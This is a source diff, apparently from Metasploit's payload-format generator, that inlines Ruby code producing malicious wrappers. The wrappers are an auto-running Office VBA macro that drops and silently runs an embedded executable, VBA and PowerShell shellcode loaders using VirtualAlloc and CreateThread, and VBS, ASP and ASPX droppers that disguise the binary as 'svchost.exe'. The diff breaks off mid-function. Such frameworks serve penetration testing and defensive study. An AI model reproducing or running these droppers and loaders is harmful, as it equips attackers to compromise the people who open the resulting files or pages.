@@ -498,6 +498,14 @@ require 'msf/core/exe/segment_injector'
       mo = fd.read(fd.stat.size)
     }
 
+    # Allow the user to specify their own template
+    set_template_default(opts, "template_armle_darwin.bin")
+
+    mo = ''
+    File.open(opts[:template], "rb") { |fd|
+      mo = fd.read(fd.stat.size)
+    }
+
     bo = mo.index('PAYLOAD:')
     raise RuntimeError, "Invalid OSX ArmLE Mach-O template: missing \"PAYLOAD:\" tag" if not bo
     mo[bo, code.length] = code
@@ -687,175 +695,454 @@ require 'msf/core/exe/segment_injector'
 
   def self.to_exe_vba(exes='')
     exe = exes.unpack('C*')
-    hash_sub = {}
+    vba = ""
     idx = 0
     maxbytes = 2000
+
+    var_magic    = Rex::Text.rand_text_alpha(10).capitalize
+    var_base     = Rex::Text.rand_text_alpha(5).capitalize
     var_base_idx = 0
-    var_base = Rex::Text.rand_text_alpha(5).capitalize
 
     # First write the macro into the vba file
-    hash_sub[:var_magic] = Rex::Text.rand_text_alpha(10).capitalize
-    hash_sub[:var_fname] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:var_fenvi] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:var_fhand] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:var_parag] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:var_itemp] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:var_btemp] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:var_appnr] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:var_index] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:var_gotmagic] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:var_farg] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:var_stemp] = var_base + (var_base_idx+=1).to_s
-    hash_sub[:filename] = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_fname = var_base + (var_base_idx+=1).to_s
+    var_fenvi = var_base + (var_base_idx+=1).to_s
+    var_fhand = var_base + (var_base_idx+=1).to_s
+    var_parag = var_base + (var_base_idx+=1).to_s
+    var_itemp = var_base + (var_base_idx+=1).to_s
+    var_btemp = var_base + (var_base_idx+=1).to_s
+    var_appnr = var_base + (var_base_idx+=1).to_s
+    var_index = var_base + (var_base_idx+=1).to_s
+    var_gotmagic = var_base + (var_base_idx+=1).to_s
+    var_farg = var_base + (var_base_idx+=1).to_s
+    var_stemp = var_base + (var_base_idx+=1).to_s
 
     # Function 1 extracts the binary
-    hash_sub[:func_name1] = var_base + (var_base_idx+=1).to_s
+    func_name1 = var_base + (var_base_idx+=1).to_s
 
     # Function 2 executes the binary
-    hash_sub[:func_name2] = var_base + (var_base_idx+=1).to_s
+    func_name2 = var_base + (var_base_idx+=1).to_s
 
-    hash_sub[:data] = ""
+    vba << "'**************************************************************\r\n"
+    vba << "'*\r\n"
+    vba << "'* This code is now split into two pieces:\r\n"
+    vba << "'*  1. The Macro. This must be copied into the Office document\r\n"
+    vba << "'*     macro editor. This macro will run on startup.\r\n"
+    vba << "'*\r\n"
+    vba << "'*  2. The Data. The hex dump at the end of this output must be\r\n"
+    vba << "'*     appended to the end of the document contents.\r\n"
+    vba << "'*\r\n"
+    vba << "'**************************************************************\r\n"
+    vba << "'*\r\n"
+    vba << "'* MACRO CODE\r\n"
+    vba << "'*\r\n"
+    vba << "'**************************************************************\r\n"
+
+    # The wrapper makes it easier to integrate it into other macros
+    vba << "Sub Auto_Open()\r\n"
+    vba << "\t#{func_name1}\r\n"
+    vba << "End Sub\r\n"
+
+    vba << "Sub #{func_name1}()\r\n"
+    vba << "\tDim #{var_appnr} As Integer\r\n"
+    vba << "\tDim #{var_fname} As String\r\n"
+    vba << "\tDim #{var_fenvi} As String\r\n"
+    vba << "\tDim #{var_fhand} As Integer\r\n"
+    vba << "\tDim #{var_parag} As Paragraph\r\n"
+    vba << "\tDim #{var_index} As Integer\r\n"
+    vba << "\tDim #{var_gotmagic} As Boolean\r\n"
+    vba << "\tDim #{var_itemp} As Integer\r\n"
+    vba << "\tDim #{var_stemp} As String\r\n"
+    vba << "\tDim #{var_btemp} As Byte\r\n"
+    vba << "\tDim #{var_magic} as String\r\n"
+    vba << "\t#{var_magic} = \"#{var_magic}\"\r\n"
+    vba << "\t#{var_fname} = \"#{Rex::Text.rand_text_alpha(rand(8)+8)}.exe\"\r\n"
+    vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
+    vba << "\tChDrive (#{var_fenvi})\r\n"
+    vba << "\tChDir (#{var_fenvi})\r\n"
+    vba << "\t#{var_fhand} = FreeFile()\r\n"
+    vba << "\tOpen #{var_fname} For Binary As #{var_fhand}\r\n"
+    vba << "\tFor Each #{var_parag} in ActiveDocument.Paragraphs\r\n"
+    vba << "\t\tDoEvents\r\n"
+    vba << "\t\t\t#{var_stemp} = #{var_parag}.Range.Text\r\n"
+    vba << "\t\tIf (#{var_gotmagic} = True) Then\r\n"
+    vba << "\t\t\t#{var_index} = 1\r\n"
+    vba << "\t\t\tWhile (#{var_index} < Len(#{var_stemp}))\r\n"
+    vba << "\t\t\t\t#{var_btemp} = Mid(#{var_stemp},#{var_index},4)\r\n"
+    vba << "\t\t\t\tPut ##{var_fhand}, , #{var_btemp}\r\n"
+    vba << "\t\t\t\t#{var_index} = #{var_index} + 4\r\n"
+    vba << "\t\t\tWend\r\n"
+    vba << "\t\tElseIf (InStr(1,#{var_stemp},#{var_magic}) > 0 And Len(#{var_stemp}) > 0) Then\r\n"
+    vba << "\t\t\t#{var_gotmagic} = True\r\n"
+    vba << "\t\tEnd If\r\n"
+    vba << "\tNext\r\n"
+    vba << "\tClose ##{var_fhand}\r\n"
+    vba << "\t#{func_name2}(#{var_fname})\r\n"
+    vba << "End Sub\r\n"
+
+    vba << "Sub #{func_name2}(#{var_farg} As String)\r\n"
+    vba << "\tDim #{var_appnr} As Integer\r\n"
+    vba << "\tDim #{var_fenvi} As String\r\n"
+    vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
+    vba << "\tChDrive (#{var_fenvi})\r\n"
+    vba << "\tChDir (#{var_fenvi})\r\n"
+    vba << "\t#{var_appnr} = Shell(#{var_farg}, vbHide)\r\n"
+    vba << "End Sub\r\n"
+
+    vba << "Sub AutoOpen()\r\n"
+    vba << "\tAuto_Open\r\n"
+    vba << "End Sub\r\n"
+
+    vba << "Sub Workbook_Open()\r\n"
+    vba << "\tAuto_Open\r\n"
+    vba << "End Sub\r\n"
+    vba << "'**************************************************************\r\n"
+    vba << "'*\r\n"
+    vba << "'* PAYLOAD DATA\r\n"
+    vba << "'*\r\n"
+    vba << "'**************************************************************\r\n\r\n\r\n"
+    vba << "#{var_magic}\r\n"
 
     # Writing the bytes of the exe to the file
     1.upto(exe.length) do |pc|
       while(c = exe[idx])
-        hash_sub[:data] << "&H#{("%.2x" % c).upcase}"
+        vba << "&H#{("%.2x" % c).upcase}"
         if (idx > 1 and (idx % maxbytes) == 0)
           # When maxbytes are written make a new paragrpah
-          hash_sub[:data] << "\r\n"
+          vba << "\r\n"
         end
         idx += 1
       end
     end
-
-    return read_replace_script_template("to_exe.vba.template", hash_sub)
+    return vba
   end
 
-def self.to_vba(framework,code,opts={})
-    hash_sub = {}
-    hash_sub[:var_myByte]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_myArray]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_rwxpage]  	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_res]      	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_offset] 		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lpThreadAttributes] = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_dwStackSize]        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lpStartAddress]     = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lpParameter]        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_dwCreationFlags]	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lpThreadID]         = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lpAddr]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lSize]              = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_flAllocationType]   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_flProtect]          = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lDest]	          = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_Source]	 	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_Length]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+  def self.to_vba(framework,code,opts={})
+    var_myByte    = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_myArray   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_rwxpage   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_res       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_offset    = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lpThreadAttributes = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_dwStackSize        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lpStartAddress     = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lpParameter        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_dwCreationFlags  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lpThreadID       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lpAddr           = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lSize            = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_flAllocationType = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_flProtect        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lDest        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_Source       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_Length       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
 
     # put the shellcode bytes into an array
-    hash_sub[:bytes] = Rex::Text.to_vbapplication(code, hash_sub[:var_myArray])
+    bytes = ''
+    maxbytes = 20
+    codebytes = code.unpack('C*')
+    1.upto(codebytes.length) do |idx|
+      bytes << codebytes[idx].to_s
+      bytes << "," if idx < codebytes.length - 1
+      bytes << " _\r\n" if (idx > 1 and (idx % maxbytes) == 0)
+    end
 
-    return read_replace_script_template("to_mem.vba.template", hash_sub)
+    "#If Vba7 Then
+Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal #{var_lpThreadAttributes} As Long, ByVal #{var_dwStackSize} As Long, ByVal #{var_lpStartAddress} As LongPtr, #{var_lpParameter} As Long, ByVal #{var_dwCreationFlags} As Long, #{var_lpThreadID} As Long) As LongPtr
+Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal #{var_lpAddr} As Long, ByVal #{var_lSize} As Long, ByVal #{var_flAllocationType} As Long, ByVal #{var_flProtect} As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As LongPtr, ByRef #{var_Source} As Any, ByVal #{var_Length} As Long) As LongPtr
+#Else
+Private Declare Function CreateThread Lib \"kernel32\" (ByVal #{var_lpThreadAttributes} As Long, ByVal #{var_dwStackSize} As Long, ByVal #{var_lpStartAddress} As Long, #{var_lpParameter} As Long, ByVal #{var_dwCreationFlags} As Long, #{var_lpThreadID} As Long) As Long
+Private Declare Function VirtualAlloc Lib \"kernel32\" (ByVal #{var_lpAddr} As Long, ByVal #{var_lSize} As Long, ByVal #{var_flAllocationType} As Long, ByVal #{var_flProtect} As Long) As Long
+Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As Long, ByRef #{var_Source} As Any, ByVal #{var_Length} As Long) As Long
+#EndIf
+
+Sub Auto_Open()
+  Dim #{var_myByte} As Long, #{var_myArray} As Variant, #{var_offset} As Long
+#If Vba7 Then
+  Dim  #{var_rwxpage} As LongPtr, #{var_res} As LongPtr
+#Else
+  Dim  #{var_rwxpage} As Long, #{var_res} As Long
+#EndIf
+  #{var_myArray} = Array(#{bytes})
+  #{var_rwxpage} = VirtualAlloc(0, UBound(#{var_myArray}), &H1000, &H40)
+  For #{var_offset} = LBound(#{var_myArray}) To UBound(#{var_myArray})
+    #{var_myByte} = #{var_myArray}(#{var_offset})
+    #{var_res} = RtlMoveMemory(#{var_rwxpage} + #{var_offset}, #{var_myByte}, 1)
+  Next #{var_offset}
+  #{var_res} = CreateThread(0, 0, #{var_rwxpage}, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+  Auto_Open
+End Sub
+Sub Workbook_Open()
+  Auto_Open
+End Sub
+"
+  end
+
+  def self.to_win32pe_vba(framework, code, opts={})
+    to_exe_vba(to_win32pe(framework, code, opts))
   end
 
   def self.to_exe_vbs(exes = '', opts={})
     delay   = opts[:delay]   || 5
     persist = opts[:persist] || false
 
-    hash_sub = {}
-    hash_sub[:var_shellcode] = ""
-    hash_sub[:var_bytes]   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
-    hash_sub[:var_fname]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_func]    = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_stream]  = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_obj]     = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_shell]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8)+8)
+    exe = exes.unpack('C*')
+    vbs = ""
 
-    hash_sub[:var_shellcode] = Rex::Text.to_vbscript(exes, hash_sub[:var_bytes])
+    var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+    var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
 
-    hash_sub[:init] = ""
+    vbs << "Function #{var_func}()\r\n"
 
-    if(persist)
-      hash_sub[:init] << "Do\r\n"
-      hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
-      hash_sub[:init] << "WScript.Sleep #{delay * 1000}\r\n"
-      hash_sub[:init] << "Loop\r\n"
-    else
-      hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
+    vbs << "#{var_bytes}=Chr(#{exe[0]})"
+
+    lines = []
+    1.upto(exe.length-1) do |byte|
+      if(byte % 100 == 0)
+        lines.push "\r\n#{var_bytes}=#{var_bytes}"
+      end
+      # exe is an Array of bytes, not a String, thanks to the unpack
+      # above, so the following line is not subject to the different
+      # treatments of String#[] between ruby 1.8 and 1.9
+      lines.push "&Chr(#{exe[byte]})"
     end
+    vbs << lines.join("") + "\r\n"
 
-    return read_replace_script_template("to_exe.vbs.template", hash_sub)
+    vbs << "Dim #{var_obj}\r\n"
+    vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
+    vbs << "Dim #{var_stream}\r\n"
+    vbs << "Dim #{var_tempdir}\r\n"
+    vbs << "Dim #{var_tempexe}\r\n"
+    vbs << "Dim #{var_basedir}\r\n"
+    vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
+
+    vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
+    vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
+    vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
+    vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe}, true , false)\r\n"
+    vbs << "#{var_stream}.Write #{var_bytes}\r\n"
+    vbs << "#{var_stream}.Close\r\n"
+    vbs << "Dim #{var_shell}\r\n"
+    vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
+
+    vbs << "#{var_shell}.run #{var_tempexe}, 0, true\r\n"
+    vbs << "#{var_obj}.DeleteFile(#{var_tempexe})\r\n"
+    vbs << "#{var_obj}.DeleteFolder(#{var_basedir})\r\n"
+    vbs << "End Function\r\n"
+
+    vbs << "Do\r\n" if persist
+    vbs << "#{var_func}\r\n"
+    vbs << "WScript.Sleep #{delay * 1000}\r\n" if persist
+    vbs << "Loop\r\n" if persist
+    vbs
   end
 
   def self.to_exe_asp(exes = '', opts={})
-    hash_sub = {}
-    hash_sub[:var_bytes]   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
-    hash_sub[:var_fname]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_func]    = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_stream]  = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_obj]     = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_shell]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8)+8)
+    exe = exes.unpack('C*')
+    vbs = "<%\r\n"
 
-    hash_sub[:var_shellcode] = Rex::Text.to_vbscript(exes, hash_sub[:var_bytes])
+    var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+    var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
 
-    return read_replace_script_template("to_exe.asp.template", hash_sub)
+    vbs << "Sub #{var_func}()\r\n"
+
+    vbs << "#{var_bytes}=Chr(#{exe[0]})"
+
+    lines = []
+    1.upto(exe.length-1) do |byte|
+      if(byte % 100 == 0)
+        lines.push "\r\n#{var_bytes}=#{var_bytes}"
+      end
+      # exe is an Array of bytes, not a String, thanks to the unpack
+      # above, so the following line is not subject to the different
+      # treatments of String#[] between ruby 1.8 and 1.9
+      lines.push "&Chr(#{exe[byte]})"
+    end
+    vbs << lines.join("") + "\r\n"
+
+    vbs << "Dim #{var_obj}\r\n"
+    vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
+    vbs << "Dim #{var_stream}\r\n"
+    vbs << "Dim #{var_tempdir}\r\n"
+    vbs << "Dim #{var_tempexe}\r\n"
+    vbs << "Dim #{var_basedir}\r\n"
+    vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
+
+    vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
+    vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
+    vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
+    vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
+    vbs << "#{var_stream}.Write #{var_bytes}\r\n"
+    vbs << "#{var_stream}.Close\r\n"
+    vbs << "Dim #{var_shell}\r\n"
+    vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
+
+    vbs << "#{var_shell}.run #{var_tempexe}, 0, false\r\n"
+    vbs << "End Sub\r\n"
+
+    vbs << "#{var_func}\r\n"
+    vbs << "%>\r\n"
+    vbs
   end
 
   def self.to_exe_aspx(exes = '', opts={})
-    hash_sub = {}
-    hash_sub[:var_file] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempdir] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_basedir]	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_filename] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempexe] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_iterator] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_proc]	= Rex::Text.rand_text_alpha(rand(8)+8)
+    exe = exes.unpack('C*')
 
-    hash_sub[:shellcode] = Rex::Text.to_csharp(exes,100,hash_sub[:var_file])
+    var_file = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_filename = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_iterator = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_proc = Rex::Text.rand_text_alpha(rand(8)+8)
 
-    return read_replace_script_template("to_exe.aspx.template", hash_sub)
+    source = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\r\n"
+    source << "<%@ Import Namespace=\"System.IO\" %>\r\n"
+    source << "<script runat=\"server\">\r\n"
+    source << "\tprotected void Page_Load(object sender, EventArgs e)\r\n"
+    source << "\t{\r\n"
+    source << "\t\tStringBuilder #{var_file} = new StringBuilder();\r\n"
+    source << "\t\t#{var_file}.Append(\"\\x#{exe[0].to_s(16)}"
+
+    1.upto(exe.length-1) do |byte|
+        # Apparently .net 1.0 has a limit of 2046 chars per line
+        if(byte % 100 == 0)
+            source << "\");\r\n\t\t#{var_file}.Append(\""
+        end
+        source << "\\x#{exe[byte].to_s(16)}"
+    end
+
+    source << "\");\r\n"
+    source << "\t\tstring #{var_tempdir} = Path.GetTempPath();\r\n"
+    source << "\t\tstring #{var_basedir} = Path.Combine(#{var_tempdir}, \"#{var_filename}\");\r\n"
+    source << "\t\tstring #{var_tempexe} = Path.Combine(#{var_basedir}, \"svchost.exe\");\r\n"
+    source << "\r\n"
+    source << "\t\tDirectory.CreateDirectory(#{var_basedir});\r\n"
+    source << "\r\n"
+    source << "\t\tFileStream fs = File.Create(#{var_tempexe});\r\n"
+    source << "\t\ttry\r\n"
+    source << "\t\t{\r\n"
+    source << "\t\t\tforeach (char #{var_iterator} in #{var_file}.ToString())\r\n"
+    source << "\t\t\t{\r\n"
+    source << "\t\t\t\tfs.WriteByte(Convert.ToByte(#{var_iterator}));\r\n"
+    source << "\t\t\t}\r\n"
+    source << "\t\t}\r\n"
+    source << "\t\tfinally\r\n"
+    source << "\t\t{\r\n"
+    source << "\t\t\tif (fs != null) ((IDisposable)fs).Dispose();\r\n"
+    source << "\t\t}\r\n"
+    source << "\r\n"
+    source << "\t\tSystem.Diagnostics.Process #{var_proc} = new System.Diagnostics.Process();\r\n"
+    source << "\t\t#{var_proc}.StartInfo.CreateNoWindow = true;\r\n"
+    source << "\t\t#{var_proc}.StartInfo.UseShellExecute = true;\r\n"
+    source << "\t\t#{var_proc}.StartInfo.FileName = #{var_tempexe};\r\n"
+    source << "\t\t#{var_proc}.Start();\r\n"
+    source << "\r\n"
+    source << "\t}\r\n"
+    source << "</script>\r\n"
+    source
   end
 
   def self.to_win32pe_psh_net(framework, code, opts={})
-    hash_sub = {}
-    hash_sub[:var_code] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_kernel32] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_baseaddr] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_threadHandle] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_output] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_temp] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_codeProvider] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_compileParams] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)
+    var_code = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_kernel32 = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_baseaddr = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_threadHandle = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_output = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_temp = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_codeProvider = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_compileParams = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_syscode = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_function = Rex::Text.rand_text_alpha_lower(rand(3)+2)
 
-    hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])
-
-    return read_replace_script_template("to_mem_dotnet.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
+    psh = "Set-StrictMode -Version 2\r\n"
+    # Configure the C# namespace
+    psh << "$#{var_syscode} = @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n"
+    psh << "namespace #{var_kernel32} {\r\n"
+    psh << "public class #{var_function} {\r\n"
+    psh << "[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }\r\n"
+    psh << "[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }\r\n"
+    psh << "[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }\r\n"
+    psh << "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n"
+    psh << "[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n"
+    psh << "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);\r\n"
+    psh << "} }\r\n"
+    psh << "\"@\r\n\r\n"
+    # Creat the compiler and set options for in-memory compile
+    psh << "$#{var_codeProvider} = New-Object Microsoft.CSharp.CSharpCodeProvider\r\n"
+    psh << "$#{var_compileParams} = New-Object System.CodeDom.Compiler.CompilerParameters\r\n"
+    psh << "$#{var_compileParams}.ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))\r\n"
+    psh << "$#{var_compileParams}.GenerateInMemory = $True\r\n"
+    psh << "$#{var_output} = $#{var_codeProvider}.CompileAssemblyFromSource($#{var_compileParams}, $#{var_syscode})\r\n\r\n"
+    # Generate our payload byte array
+    # My apologies to the formatting gods, but this type of payload
+    # is space constrained by cmd.exe's character limit.
+    # The usual convention for col-width in the payload variable is untenable here
+    psh << "[Byte[]]$#{var_code} = #{Rex::Text.to_hex(code).gsub('\x',',0x')[1..-1]}\r\n"
+    psh << "$#{var_baseaddr} = [#{var_kernel32}.#{var_function}]::VirtualAlloc(0, $#{var_code}.Length + 1, [#{var_kernel32}.#{var_function}+AllocationType]::Reserve -bOr [#{var_kernel32}.#{var_function}+AllocationType]::Commit, [#{var_kernel32}.#{var_function}+MemoryProtection]::ExecuteReadWrite)\r\n"
+    psh << "if ([Bool]!$#{var_baseaddr}) { $global:result = 3; return }\r\n"
+    psh << "[System.Runtime.InteropServices.Marshal]::Copy($#{var_code}, 0, $#{var_baseaddr}, $#{var_code}.Length)\r\n"
+    psh << "[IntPtr] $#{var_threadHandle} = [#{var_kernel32}.#{var_function}]::CreateThread(0,0,$#{var_baseaddr},0,0,0)\r\n"
+    psh << "if ([Bool]!$#{var_threadHandle}) { $global:result = 7; return }\r\n"
+    psh << "$#{var_temp} = [#{var_kernel32}.#{var_function}]::WaitForSingleObject($#{var_threadHandle}, [#{var_kernel32}.#{var_function}+Time]::Infinite) | Out-Null\r\n"
   end
 
   def self.to_win32pe_psh(framework, code, opts={})
-    hash_sub = {}
-    hash_sub[:var_code] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_win32_func]	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_payload] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_size] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_rwx] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_iter] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)
 
-    hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])
+    var_code = Rex::Text.rand_text_alpha(rand(3)+2)
